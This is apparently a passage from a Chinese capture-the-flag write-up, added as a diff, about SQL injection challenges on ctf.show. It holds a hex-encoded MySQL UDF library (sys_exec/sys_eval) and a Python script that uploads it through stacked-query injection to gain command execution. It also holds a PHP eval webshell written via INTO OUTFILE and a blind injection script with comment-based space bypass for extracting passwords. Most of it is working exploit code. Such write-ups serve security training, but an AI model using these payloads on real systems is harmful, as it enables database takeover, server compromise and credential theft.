FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400'
+codes = []
+for i in range(0, len(code), 128):
+    codes.append(code[i:min(i + 128, len(code))])
+
+def attack(sql):
+    url = "http://1655fbe1-c591-43ac-b04e-6250ae9488e3.challenge.ctf.show/login.php"
+    payload = '''0';{};-- A'''.format(sql)
+    data = {"username": "\\", "password": payload}
+    r=requests.post(url, data)
+    print(r.text)
+    print(r.status_code)
+    time.sleep(1)
+
+sql = '''create table temp(data longblob)'''
+attack(sql)
+
+# 清空临时表
+sql = '''delete from temp'''
+attack(sql)
+
+# 插入第一段数据
+sql = '''insert into temp(data) values (0x{})'''.format(codes[0])
+attack(sql)
+
+# 更新连接剩余数据
+for k in range(1, len(codes)):
+    sql = '''update temp set data = concat(data,0x{})'''.format(codes[k])
+    attack(sql)
+
+# 10.3.18-MariaDB
+# 写入so文件
+sql = '''select data from temp into dumpfile '/usr/lib/mariadb/plugin/udf.so\''''
+attack(sql)
+
+# 引入自定义函数
+sql = '''create function sys_eval returns string soname 'udf.so\''''
+attack(sql)
+
+# 命令执行，结果更新到界面
+sql = '''update users set password=(select sys_eval('ls'))'''
+attack(sql)
+
+```
+
+失败了，但是方法肯定就是这个方法，如果师傅后续解出，来教教我
+
+---
+
+艹，原来当时差点就成功了，写webshell的时候闭合错了
+
+```
+username=\&password=or 1=1;select "<?php eval(\$_POST[1]);phpinfo();?>" into outfile "/var/www/html/shell.php"#
+```
+
+## WAF绕过
+
+```http
+POST /login.php HTTP/1.1
+Host: 06941acf-a613-4e59-ba07-cc49063d9f52.challenge.ctf.show
+Connection: keep-alive
+Content-Length: 29
+Cache-Control: max-age=0
+sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "macOS"
+Origin: https://06941acf-a613-4e59-ba07-cc49063d9f52.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://06941acf-a613-4e59-ba07-cc49063d9f52.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br, zstd
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=unaorkkoo6dbgnsu4teqn5rmo8
+
+username=admin'and(1=1)#&password=admin
+```
+
+把上一题用的脚本修改一下即可，看了一下只需要绕过空格
+
+```python
+import requests
+
+url = "http://06941acf-a613-4e59-ba07-cc49063d9f52.challenge.ctf.show/login.php"
+i = 0
+target = ""
+
+while True:
+    i += 1
+    head = 32
+    tail = 127
+    while head + 1 < tail:
+        mid = (tail + head) // 2
+        payload = "admin'and/**/(ascii(substr((select/**/password/**/from/**/users),{},1))<{})#".format(i, mid)
+
+        data = {
+            "username": payload,
+            "password": "test",
+        }
+        r = requests.post(url, data)
+        if "Invalid username or password" in r.text:
+            head = mid
+        else:
+            tail = mid
+
+    if head != 32:
+        target += chr(head)
+    else:
+        break
+    print(target)
+```
+
